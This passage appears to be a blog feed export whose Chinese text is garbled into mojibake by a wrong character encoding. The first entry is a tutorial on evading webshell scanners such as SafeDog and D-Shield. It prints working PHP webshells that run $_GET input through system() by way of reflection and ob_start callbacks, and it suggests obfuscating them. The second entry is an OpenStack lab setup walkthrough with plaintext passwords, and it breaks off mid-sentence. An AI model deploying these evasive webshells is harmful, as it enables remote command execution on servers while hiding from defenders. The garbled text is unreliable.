åœ¨phpæ–‡ä»¶è¿›è¡Œç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šå¯¹å…¶è¿›è¡Œåˆ†æ”¯ä¼˜åŒ–ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ®µä»£ç å› ä¸ºifè¯­å¥ä¸­ä¸ºfalseï¼Œå±äºæ­»ç ï¼Œæ°¸è¿œä¸ä¼šè¿è¡Œï¼Œæ‰€ä»¥ç¼–è¯‘å™¨ä¼šå°†å…¶åˆ é™¤æ‰ã€‚ä½†æ˜¯æ¢åšæŸ¥æ€å¼•æ“ï¼Œä¼šç›´æ¥æŸ¥æ€å¹¶æŠ¥è­¦ã€‚æ®æˆ‘çŒœæµ‹ï¼Œphpçš„æ§åˆ¶æµç¨‹è·³è½¬é‚£ä¹ˆå¤šï¼Œå¦‚æœæŸ¥æ€å¼•æ“ä¹Ÿåƒç¼–è¯‘å™¨é‚£æ ·åšåˆ†æ”¯ç»“æ„çš„ä¼˜åŒ–ï¼ŒåŠ¿å¿…ä¼šé€ æˆæŸ¥æ€æ•ˆç‡çš„é™ä½ã€‚æ‰€ä»¥æ²¡åŠæ³•ï¼Œåªå¥½ä¸ç®¡åˆ†æ”¯ç»“æ„ï¼Œç›´æ¥æŸ¥æ€ã€‚èº²é¿æŸ¥æ€çš„æ–¹æ³•ä¸Šé¢å¤§è‡´ä»‹ç»äº†ä¸¤ç§æŸ¥æ€å¼•æ“çš„åŠæ³•ï¼Œè™½ç„¶æ¯”è¾ƒç²—ç•¥ï¼Œä½†æ˜¯ä¹Ÿç»™äº†æˆ‘ä»¬èº²é¿æŸ¥æ€çš„æ€è·¯ã€‚é‚£å°±æ˜¯ï¼Œæƒ³åŠæ³•éšè—å…³é”®çš„ç‰¹å¾ç ã€‚åˆ©ç”¨phpåå°„æŠ€æœ¯åå°„æ˜¯åœ¨PHPè¿è¡ŒçŠ¶æ€ä¸­ï¼Œæ‰©å±•åˆ†æPHPç¨‹åºï¼Œå¯¼å‡ºæˆ–æå–å‡ºå…³äºç±»ã€æ–¹æ³•ã€å±æ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šã€‚è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºåå°„APIã€‚åå°„æ˜¯æ“çºµé¢å‘å¯¹è±¡èŒƒå‹ä¸­å…ƒæ¨¡å‹çš„APIï¼Œå…¶åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå¯å¸®åŠ©æˆ‘ä»¬æ„å»ºå¤æ‚ï¼Œå¯æ‰©å±•çš„åº”ç”¨ã€‚å…¶ç”¨é€”å¦‚ï¼šè‡ªåŠ¨åŠ è½½æ’ä»¶ï¼Œè‡ªåŠ¨ç”Ÿæˆæ–‡æ¡£ï¼Œç”šè‡³å¯ç”¨æ¥æ‰©å……PHPè¯­è¨€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå°„å»åŠ è½½systemå‡½æ•°ï¼Œé€šè¿‡åå°„å»ä¼ å‚ã€‚å› ä¸ºåœ¨åå°„ä¸­ï¼Œsystemè¿™ä¸ªç‰¹å¾ç åªä¸è¿‡æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆå®¹æ˜“å¯¹å…¶è¿›è¡ŒåŠ è§£å¯†ç­‰æ“ä½œå»èº²å¼€æŸ¥æ€å¼•æ“çš„æŸ¥æ€ã€‚è¿‡ç‹—ä¾‹å­&lt;?php$func = new ReflectionFunction(â€œsystemâ€);echo $func-&gt;invokeArgs(array(â€œ$_GET[c]â€));?&gt;è¿™ä¸ªå®‰å…¨ç‹—æŸ¥ä¸åˆ°ï¼Œä½†æ˜¯dç›¾å¯ä»¥æŸ¥åˆ°ï¼Œè€Œdç›¾æŸ¥æ€ç»“æœæ˜¯å¯ç–‘å‡½æ•°è°ƒç”¨ï¼ŒåŸºæœ¬ä¸Šç­‰äºæ²¡æŸ¥åˆ°ã€‚ä¸‹é¢æ¥ä¸€æ®µdç›¾å’Œéƒ½æŸ¥ä¸åˆ°çš„shell&lt;?phpclass HelloWorld { public function sayHelloTo($name) { $last_line = system($name); return $last_line; }}$a=$_GET[â€œaâ€];$reflectionMethod = new ReflectionMethod(â€˜HelloWorldâ€™, â€˜sayHelloToâ€™);echo $reflectionMethod-&gt;invoke(new HelloWorld(), $a);?&gt;åˆ©ç”¨åå°„ç±»ä¸­å‡½æ•°çš„åŠæ³•å»æ‰§è¡Œå±é™©å‡½æ•°åˆ©ç”¨phpçš„callbackæ–¹æ³•è‡ª PHP 5.4 èµ·å¯ç”¨ callable&nbsp;ç±»å‹æŒ‡å®šå›è°ƒç±»å‹ callbackã€‚æœ¬æ–‡æ¡£åŸºäºåŒæ ·ç†ç”±ä½¿ç”¨ callback&nbsp;ç±»å‹ä¿¡æ¯ã€‚ä¸€äº›å‡½æ•°å¦‚ call_user_func()&nbsp;æˆ– usort()&nbsp;å¯ä»¥æ¥å—ç”¨æˆ·è‡ªå®šä¹‰çš„å›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ã€‚å›è°ƒå‡½æ•°ä¸æ­¢å¯ä»¥æ˜¯ç®€å•å‡½æ•°ï¼Œè¿˜å¯ä»¥æ˜¯å¯¹è±¡çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬é™æ€ç±»æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œcallbackä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ï¼Œå¹¶å°†å…¶ä½œä¸ºå‡½æ•°å»æ‰§è¡Œã€‚ä¸‹é¢æ˜¯ä¾‹å­&lt;?php$cb= â€˜systemâ€™;ob_start($cb);echo $_GET[c];ob_end_flush();?&gt;åœ¨phpä¸­å›è°ƒå‡½æ•°æœ‰å¾ˆå¤šï¼Œæ‰“å¼€phpçš„å®˜æ–¹æ‰‹å†Œï¼Œæ‰¾åˆ°æ”¯æŒcallbackçš„å‡½æ•°ï¼ŒåŸºæœ¬ä¸Šéƒ½å¯ä»¥ç”¨æ¥åšè¿‡ç‹—ä¸€å¥è¯ç‰¹å¾ç çš„å˜å½¢éšè—åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸçš„å°†å‡½æ•°è°ƒç”¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œç„¶åé€šè¿‡åå°„ç­‰æ–¹å¼å»æ‰§è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦èº²é¿æ­£åˆ™åŒ¹é…ç­‰æŸ¥æ€å¼•æ“ï¼Œè¿™é‡Œè¿˜éœ€è¦å¯¹ç‰¹å¾ç å˜å½¢ã€‚å½“ç„¶äº†ï¼Œè¿™é‡Œå˜å½¢çš„æ“ä½œå°±å¾ˆå¤šäº†ï¼Œä¾‹å¦‚base64åŠ å¯†ï¼Œgzipå‹ç¼©ï¼Œæˆ–è€…ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸€æ®µåŠ è§£å¯†å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚è¿™é‡Œå°±ä¸è¯¦ç»†ä»‹ç»äº†ã€‚è¿‡ç‹—çš„ä¾‹å­æœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªä¸è¿‡ç»™å‡ºæ€è·¯ã€‚phpä½œä¸ºä¸€é—¨å¼±ç±»å‹çš„è¯­è¨€ï¼Œå¯æ‰©å±•æ€§ï¼Œçµæ´»æ€§æ¯”javaä¸€ç±»ç­‰è¯­è¨€å¼ºå¾ˆå¤šã€‚ä½†æ˜¯è¿‡äºçµæ´»ä¹Ÿä¼šå¯¼è‡´å¾ˆå¤šå®‰å…¨é—®é¢˜ã€‚åœ¨é™æ€æŸ¥æ€ä¸­ï¼Œå¾ˆå®¹æ˜“èº²é¿æŸ¥æ€ï¼Œé€ æˆæ¼æŠ¥ç­‰é—®é¢˜ã€‚æ‰€ä»¥åœ¨å®‰å…¨ç‹—çš„åšå®¢ä¸­ï¼Œä¹Ÿè®²äº†é™æ€æŸ¥æ€ä¸å¤ªé è°±ï¼Œè¿˜æ˜¯é˜²å¾¡å¥½é»‘å®¢ä¸Šä¼ shellæ‰æ˜¯æ­£é“ï¼Œä½¿å…¶æ²¡æœ‰ä¸Šä¼ webshellçš„æœºä¼šã€‚åˆæ¬¡å†™æ–‡ç« ï¼Œæœ‰äº›åœ°æ–¹å¯èƒ½ä¼šæœ‰æŠ€æœ¯ä¸Šçš„é—®é¢˜ï¼Œæœ›å¤§ç‰›æ–§æ­£æ‰¹è¯„ã€‚ä¹Ÿæœ›å„è·¯å¤§ç¥äº¤æµè¿‡ç‹—æ€è·¯ï¼Œå…±åŒå­¦ä¹ è¿›æ­¥ã€‚å‚è€ƒèµ„æ–™http://blog.safedog.cn/?p=77&nbsp; &nbsp; &nbsp; ä¸€ç§ç†æƒ³çš„ç½‘ç«™æœ¨é©¬é˜²æŠ¤æ€è·¯æ¢ç©¶http://php.net/manual/zh/language.types.callable.php&nbsp; &nbsp; &nbsp; &nbsp; phpcallbackhttps://secure.php.net/manual/zh/reflectionfunction.invoke.php&nbsp;php &nbsp; åå°„https://security.tencent.com/index.php/blog/msg/58&nbsp;TSRCæŒ‘æˆ˜èµ›ï¼š PHPé˜²å¾¡ç»•è¿‡æŒ‘æˆ˜å®å½•http://wrox.cn/article/100032494/&nbsp;æœªçŸ¥æ”»ç„‰çŸ¥é˜² â€” Webshellå˜å½¢æŠ€æœ¯é›†é”¦æ–‡ï¼çƒ¤åœŸè±†å•¦ï¼ˆç®€ä¹¦ä½œè€…ï¼‰åŸæ–‡é“¾æ¥ï¼šhttp://www.jianshu.com/p/a23fbd1825c8è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ï¼Œè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œå¹¶æ ‡æ³¨â€œç®€ä¹¦ä½œè€…â€ã€‚]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenStackäº‘è®¡ç®—å¹³å°åˆä½“éªŒ]]></title>
    <url>%2F2016%2F10%2F30%2F3%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹OpenStackæ˜¯ä¸€ä¸ªæ—¨åœ¨ä¸ºå…¬å…±åŠç§æœ‰äº‘çš„å»ºè®¾ä¸ç®¡ç†æä¾›è½¯ä»¶çš„å¼€æºé¡¹ç›®;æ˜¯IaaS(åŸºç¡€è®¾æ–½å³æœåŠ¡)ç»„ä»¶ï¼Œè®©ä»»ä½•äººéƒ½å¯ä»¥è‡ªè¡Œå»ºç«‹å’Œæä¾›äº‘ç«¯è¿ç®—æœåŠ¡ã€‚æ­¤å¤–ï¼ŒOpenStackä¹Ÿç”¨ä½œå»ºç«‹é˜²ç«å¢™å†…çš„â€œç§æœ‰äº‘â€ï¼ˆPrivate&nbsp;Cloudï¼‰ï¼Œæä¾›æœºæ„æˆ–ä¼ä¸šå†…å„éƒ¨é—¨å…±äº«èµ„æºã€‚æ„å»ºæ€è·¯ç¬¬ä¸€æ­¥æ˜¯è®¾ç½®æ­£ç¡®çš„ç¡¬ä»¶å’Œç½‘ç»œç¯å¢ƒã€‚å°½ç®¡OpenStackå…è®¸åœ¨ä¸€ä¸ªå•ä¸€çš„å¹³é¢ç½‘ç»œä¸Šéƒ¨ç½²ä¸€åˆ‡ï¼Œä»å®‰å…¨çš„è§’åº¦æ¥çœ‹å¹¶ä¸å®‰å…¨ã€‚å–å†³äºä½ æ‰€ä½¿ç”¨çš„ç®¡ç†ç¨‹åºä»¥åŠè™šæ‹Ÿç½‘ç»œæ¥å£ï¼Œå®ƒä¼šå…è®¸guestè™šæ‹Ÿæœºå—…æ¢ç®¡ç†æµé‡ã€‚å»ºè®®è‡³å°‘ä½¿ç”¨ä¸¤ä¸ªç½‘ç»œï¼šä¸€ä¸ªç”¨æ¥ç®¡ç†æµé‡ï¼Œä¸€ä¸ªç”¨æ¥è¿›è¡Œè™šæ‹Ÿæœºä¹‹é—´çš„å¯¹è¯ã€‚è¿™æ„å‘³ç€æ‰€æœ‰çš„äº‘è®¡ç®—ç»“ç‚¹ä¸­ä½ éœ€è¦ä¸¤ä¸ªç½‘å¡ï¼ˆä¸€ä¸ªè¿è¡Œå®ä¾‹ï¼‰å’Œç½‘ç»œç®¡ç†è€…ã€‚è¿™äº›åº”è¯¥è¿è¡Œåœ¨ä¸åŒçš„IPèŒƒå›´ä¸­ã€‚è®¡ç®—ç»“ç‚¹å’Œå®ä¾‹çš„ç½‘ç»œä¹Ÿéœ€è¦æ”¯æŒVLANæ ‡è®°ï¼Œå› ä¸ºè¿™æ˜¯åœ¨â€œé¡¹ç›®â€ä¹‹é—´éš”ç»æµé‡æ‰€ä½¿ç”¨çš„æœºåˆ¶ã€‚ä¸€ä¸ªé¡¹ç›®ç­‰ä»·äºä½ çš„äºšé©¬é€ŠEC2è´¦æˆ·ï¼Œé™¤äº†ä½ ä¸èƒ½æŒ‰ç…§ä½ æ‰€å¸Œæœ›çš„æ•°ç›®åˆ›å»ºå’Œåˆ†é…ä¹‹å¤–ã€‚æ¯ä¸€ä¸ªé¡¹ç›®éƒ½æœ‰è‡ªå·±çš„ç®¡ç†å‘˜å’Œç”¨æˆ·ï¼Œåœ¨æ—¢å®šé¡¹ç›®ä¸­çš„æ‰€æœ‰å®ä¾‹å¯ä»¥å½¼æ­¤é€šä¿¡ã€‚é€šè¿‡æŒ‡æ´¾æ¯ä¸€ä¸ªé¡¹ç›®è‡ªå·±çš„VLANä»¥åŠå†…éƒ¨å’Œå¤–éƒ¨çš„IPåœ°å€æ± æ¥æ‰§è¡Œã€‚ä¸€æ—¦ç¡¬ä»¶å’Œç½‘ç»œè®¾ç½®å¥½ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ç¡®å®šåœ¨å“ªé‡Œéƒ¨ç½²æ‰€æœ‰çš„OpenStackç»„ä»¶ã€‚æ ‡å‡†éƒ¨ç½²åº”æœ‰ä¸€ä¸ªæ§åˆ¶å™¨å’Œä¸€ç³»åˆ—è®¡ç®—ç»“ç‚¹ã€‚æ§åˆ¶å™¨è¿è¡Œæ¶ˆæ¯æœåŠ¡å™¨ï¼Œæ•°æ®åº“å’Œå…¶ä»–çš„ç»„ä»¶æ¥ç¼–æ’äº‘ï¼ŒåŒæ—¶è®¡ç®—ç»“ç‚¹è¿è¡Œå®ä¾‹ã€‚ä½†æ˜¯ä½ ä¹Ÿå¯ä»¥åˆ†è§£æ§åˆ¶å™¨ä¸ºåœ°ç†çš„éƒ¨åˆ†ï¼Œä»è€Œæ”¹å–„æ€§èƒ½ï¼ŒåƒæŠŠMySQLæ”¾åœ¨ä¸åŒçš„ç‰©ç†ç›’ä¸­ã€‚å¯¹äºå®‰å…¨è€Œè¨€ï¼Œæœ€å…³é”®çš„æ˜¯ç¡®ä¿æ¯ä¸€éƒ¨åˆ†éƒ½å®‰è£…åœ¨å®‰å…¨çš„ä¸»æœºä¸Šï¼Œä½ åªéœ€è¦å°†å…¶é™„åŠ åœ¨ç½‘ç»œä¸Šï¼Œè®©äº‘è¿è½¬å³å¯ã€‚åªæœ‰ä¸¤éƒ¨åˆ†éœ€è¦æš´éœ²ç»™å¤–é¢çš„ä¸–ç•Œï¼ˆå³ä½¿é‚£åªæ˜¯ä½ çš„ä¼ä¸šç½‘ç»œï¼‰ï¼šAPIæœåŠ¡å™¨/Web æ§åˆ¶å°ï¼ˆå¦‚æœå¼€å¯ï¼‰å’Œç½‘ç»œç®¡ç†è€…ã€‚è¿™äº›æœåŠ¡å™¨éœ€è¦è¿‡ç¡¬ï¼Œä½ ç”šè‡³å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹ç½‘ç»œæ¥å£æ¥éš”ç¦»åç«¯ç®¡ç†ç”¨æˆ·è¿æ¥äº§ç”Ÿçš„æµé‡ã€‚æ“ä½œå‡†å¤‡ç¯å¢ƒ: windowsç³»ç»Ÿï¼Œopenstackäº‘å¹³å°ï¼ˆ172.17.142.2 cloud.X.X.cnï¼‰ä¿®æ”¹windowsç³»ç»Ÿä¸»æœºåç§°&amp;IPåœ°å€æ˜ å°„æ–‡ä»¶ï¼š/windows/system32/drivers/etc/hostsè¿½åŠ ï¼š172.17.142.2&nbsp;&nbsp;&nbsp;&nbsp;cloud.X.X.cn&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;172.17.143.130&nbsp;&nbsp;controlleripåœ°å€172.17.143.130è¦æ ¹æ®åé¢ç»‘å®šæ§åˆ¶èŠ‚ç‚¹æµ®åŠ¨ipæ¥ä¿®æ”¹ã€‚ä»¥ç”¨æˆ·åtestï¼Œå¯†ç testç™»å½•äº‘å¹³å°https://cloud.X.X.cnã€‚ç½‘ç»œç®¡ç†1ã€åˆ›å»ºç½‘ç»œ&nbsp;ç½‘ç»œåç§°ï¼š135043204_network&nbsp;ç½‘ç»œåœ°å€ï¼š192.32.4.0/24&nbsp;gateway: 192.32.4.254&nbsp;åœ°å€æ± ï¼š192.32.4.10,192.32.4.200&nbsp; DNSï¼š211.71.232.652ã€åˆ›å»ºè·¯ç”±å™¨135043204_router&nbsp; &nbsp; &nbsp;é€‰æ‹©å¤–éƒ¨ç½‘ç»œï¼šadmin_floating_net&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;é…ç½®è·¯ç”±å™¨135043204_routerï¼Œå¢åŠ æ¥å£ï¼šé€‰æ‹©å­ç½‘135043204_networkå®‰è£…é…ç½®æ§åˆ¶èŠ‚ç‚¹1ã€ä»¥å¿«ç…§é•œåƒmitaka-controllerå¯åŠ¨è™šæ‹Ÿæœºï¼›2ã€å®ä¾‹åç§°ä¸ºï¼š135043204_controllerï¼Œå¯ç”¨åŸŸï¼šnovaï¼Œå®ä¾‹æ•°ï¼š1&nbsp; &nbsp; &nbsp;æºé€‰å®ä¾‹å¿«ç…§ï¼šmitaka-controller&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flavor:4core8gram10gdisk&nbsp;&nbsp; &nbsp; &nbsp;ç½‘ç»œå…ˆé€‰:135043204_network,å†é€‰ext_networkï¼ˆtipsï¼šåœ¨é€‰æ‹©ç½‘ç»œæ—¶ï¼Œç³»ç»Ÿé»˜è®¤ä¸ºç¬¬ä¸€ä¸ªç½‘å¡çš„ç½‘ &nbsp; ç»œå»ºç«‹è·¯ç”±ï¼‰&nbsp; &nbsp; &nbsp;å®‰å…¨ç»„é€‰ï¼šdefault&nbsp; &nbsp; &nbsp;ç§˜é’¥å¯¹é€‰ï¼šåˆ›å»º135043204&nbsp; &nbsp; &nbsp;å¯åŠ¨å®ä¾‹ã€‚&nbsp; &nbsp; &nbsp;ç»‘å®šæµ®åŠ¨ipï¼ˆtipsæ ¹æ®æ­¤æµ®åŠ¨ip,ä¿®æ”¹/windows/system32/drivers/etc/hostsæ–‡ä»¶ä¸­çš„controllerå¯¹åº”çš„ip.ï¼‰3ã€é€šè¿‡æµ®åŠ¨ipè¿œç¨‹è¿æ¥controller&nbsp; &nbsp; &nbsp;ç›´æ¥é€šè¿‡Xshellï¼Œé€‰æ‹©public&nbsp;keyè®¤è¯æ–¹æ³•ï¼Œå¯¼å…¥åˆ›å»ºçš„ç§é’¥135043204ï¼Œç”¨æˆ·åä¸ºï¼šcentosè¿æ¥ã€‚&nbsp; &nbsp; &nbsp;è¿æ¥åï¼Œåˆ‡æ¢åˆ°rootèº«ä»½,rootå¯†ç ä¸ºhuawei&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;su&nbsp;-&nbsp; &nbsp; &nbsp;ä¿®æ”¹/etc/ssh/sshd_config&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;å¿«é€Ÿå®šä½password&nbsp; &nbsp; &nbsp;å°†PasswordAuthentication&nbsp;noè¡Œä¸­çš„noä¿®æ”¹ä¸ºyes&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PasswordAuthentication&nbsp;yes&nbsp; &nbsp; &nbsp;å­˜ç›˜é€€å‡ºã€‚&nbsp; &nbsp; &nbsp;é‡å¯sshdæœåŠ¡ã€‚&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;sshd&nbsp; &nbsp; &nbsp;æœåŠ¡æŸ¥çœ‹,æ³¨æ„é¢œè‰²ä¸ºçº¢è‰²çš„æœåŠ¡åç§°ã€‚&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;systemctl&nbsp; &nbsp; &nbsp;ç¦ç”¨cloudç›¸å…³æœåŠ¡&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;systemctl&nbsp;disable&nbsp;cloud-config&nbsp;cloud-init&nbsp;cloud-final&nbsp;cloud-init-local&nbsp; &nbsp; &nbsp;ä¸»æœºåæŸ¥çœ‹&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hostname&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cat&nbsp;/etc/hostname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp;ä¸»æœºåè®¾ç½®&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hostnamectl&nbsp;set-hostname&nbsp;controller&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat&nbsp;/etc/hostname&nbsp;&nbsp; &nbsp; &nbsp;ip&nbsp;æŸ¥çœ‹&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ip&nbsp;a&nbsp; &nbsp; &nbsp;é…ç½®ip&amp;hostæ˜ å°„&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/hosts&nbsp; &nbsp; &nbsp;ä¿®æ”¹controllerå¯¹åº”çš„ipï¼Œï¼ˆtipsï¼šcomputeå¯¹åº”çš„ipæ ¹æ®è®¡ç®—èŠ‚ç‚¹ipæ¥ä¿®æ”¹ã€‚ï¼‰&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.32.4.13&nbsp;controller&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.32.4.15&nbsp;compute&nbsp; &nbsp; &nbsp;é…ç½®nosqlæ•°æ®åº“ï¼Œä¿®æ”¹bind_ipä¸º192.32.4.13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/mongod.conf&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;mongod&nbsp; &nbsp; &nbsp;é…ç½®mysqlæ•°æ®åº“,ä¿®æ”¹bind-addressä¸º192.32.4.13&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;vi&nbsp;/etc/my.cnf.d/openstack.cnf&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;mariadb&nbsp; &nbsp; &nbsp;é‡å¯rabbitmq-server&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;rabbitmq-server&nbsp; &nbsp; &nbsp;é…ç½®&nbsp;linuxbridge_agentï¼Œé…ç½®physical_interface_mappingsï¼Œlocal_ip&nbsp;ï¼Œé…ç½®local_ipä¸º192.32.4.13&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;vi&nbsp;/etc/neutron/plugins/ml2/linuxbridge_agent.ini&nbsp;&nbsp; &nbsp; &nbsp;é‡å¯neutron-linuxbridge-agent&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;neutron-linuxbridge-agent&nbsp; &nbsp; &nbsp;æŸ¥çœ‹æ—¥å¿—ï¼š&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cat /var/log/neutron/linuxbridge-agent.log&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat /var/log/neutron/dhcp-agent.log&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat /var/log/neutron/server.log&nbsp; &nbsp; &nbsp;é‡å¯controller&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rebootå®‰è£…é…ç½®è®¡ç®—èŠ‚ç‚¹ä»¥å¿«ç…§é•œåƒmitaka-computeå¯åŠ¨è™šæ‹Ÿæœºï¼›å®ä¾‹åç§°ä¸ºï¼š135043204_computeï¼Œå¯ç”¨åŸŸï¼šnovaï¼Œå®ä¾‹æ•°ï¼š1æºé€‰å®ä¾‹å¿«ç…§ï¼šmitaka-computeflavor:2core4g_10gç½‘ç»œé€‰:135043204_network,ext_networkå®‰å…¨ç»„é€‰ï¼šdefaultç§˜é’¥å¯¹é€‰ï¼š135043204å•å‡»å¯åŠ¨å®ä¾‹ã€‚ç»‘å®šæµ®åŠ¨ipã€‚é€šè¿‡æµ®åŠ¨ipè¿œç¨‹è¿æ¥computeç›´æ¥é€šè¿‡Xshellï¼Œé€‰æ‹©public&nbsp;keyè®¤è¯æ–¹æ³•ï¼Œä½¿ç”¨ç§é’¥135043204ï¼Œç”¨æˆ·åä¸ºï¼šcentosè¿æ¥ã€‚è¿æ¥åï¼Œåˆ‡æ¢åˆ°rootèº«ä»½su&nbsp;-ä¿®æ”¹/etc/ssh/sshd_configå¿«é€Ÿå®šä½passwordå°†PasswordAuthentication&nbsp;noè¡Œä¸­çš„noä¿®æ”¹ä¸ºyesPasswordAuthentication&nbsp;yeså­˜ç›˜é€€å‡ºã€‚é‡å¯sshdæœåŠ¡ã€‚systemctl&nbsp;restart&nbsp;sshdæœåŠ¡æŸ¥çœ‹systemctlç¦ç”¨cloudç›¸å…³æœåŠ¡systemctl&nbsp;disable&nbsp;cloud-config&nbsp;cloud-init&nbsp;cloud-final&nbsp;cloud-init-localä¸»æœºåæŸ¥çœ‹&nbsp;&nbsp;hostname&nbsp;&nbsp;cat&nbsp;/etc/hostname&nbsp;ä¸»æœºåè®¾ç½®&nbsp;&nbsp;hostnamectl&nbsp;set-hostname&nbsp;compute&nbsp;&nbsp;cat&nbsp;/etc/hostname&nbsp;ip&nbsp;æŸ¥çœ‹&nbsp;&nbsp;ip&nbsp;aé…ç½®ip&amp;hostæ˜ å°„&nbsp; &nbsp; &nbsp;vi&nbsp;/etc/hostsé…ç½®&nbsp;linuxbridge_agentï¼Œé…ç½®physical_interface_mappingsï¼Œlocal_ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/neutron/plugins/ml2/linuxbridge_agent.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;local_ip&nbsp;=&nbsp;&nbsp;192.32.4.15é‡å¯neutron-linuxbridge-agent&nbsp;&nbsp;&nbsp;systemctl&nbsp;restart&nbsp;neutron-linuxbridge-agent&nbsp;&nbsp;&nbsp;æŸ¥çœ‹æ—¥å¿—ï¼š&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/linuxbridge-agent.log&nbsp;&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/dhcp-agent.log&nbsp;&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/server.log&nbsp;é…ç½®/etc/nova/nova.confï¼Œé…ç½®my_ip&nbsp;&nbsp;my_ip&nbsp;=&nbsp;192.32.4.15é‡æ–°å¯åŠ¨openstack-nova-computesystemctl restart openstack-nova-compute&nbsp;rebootæµ‹è¯•1ã€ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•http://controller/dashboarddomain:defaultuser name:adminpassword:ADMIN_PASSåˆ›å»ºäº‘ä¸»æœºç±»å‹S135043199:1vcpu,64Mram,1gç¡¬ç›˜2ã€ä»¥æ™®é€šç”¨æˆ·èº«ä»½ç™»å½•http://controller/dashboarddomain:defaultuser name:demopassword:DEMO_PASSåˆ›å»º2ä¸ªäº‘ä¸»æœºå®ä¾‹åç§°:s135043199é•œåƒ:cirrosflavor:s135043199network: selfservice3ã€é€šè¿‡æ§åˆ¶å°è®¿é—®åˆ›å»ºå¥½çš„è™šæ‹Ÿæœºs135043199-2ç”¨æˆ·åcirrosã€å¯†ç cubswin:)æµ‹è¯•ä¸¤å°è™šæ‹Ÿæœºçš„è¿é€šæ€§ã€‚åˆ°æ­¤ç§æœ‰äº‘å¹³å°å°±éƒ¨ç½²å¹¶æµ‹è¯•æˆåŠŸã€‚&nbsp;å®‰å…¨æ€§å»ºè®®ï¼ˆâ€“å–è‡ªç™¾åº¦ç™¾ç§‘ï¼‰ï¼š MySQLæœåŠ¡å™¨ä½¿ç”¨æŒ‡å®šçš„ç”¨æˆ·è´¦æˆ·ï¼Œä¸æ˜¯æ ¹MySQLç®¡ç†è´¦æˆ·ã€‚è¿™ä¸ªè´¦æˆ·å’Œå¯†ç å°†ä¼šæš´éœ²åœ¨æ¯ä¸€ä¸ªäº‘ç»“ç‚¹ä¸Šï¼Œå³ä½¿ä½¿ç”¨åŸºäºè¯ä¹¦çš„è®¤è¯ï¼Œå› 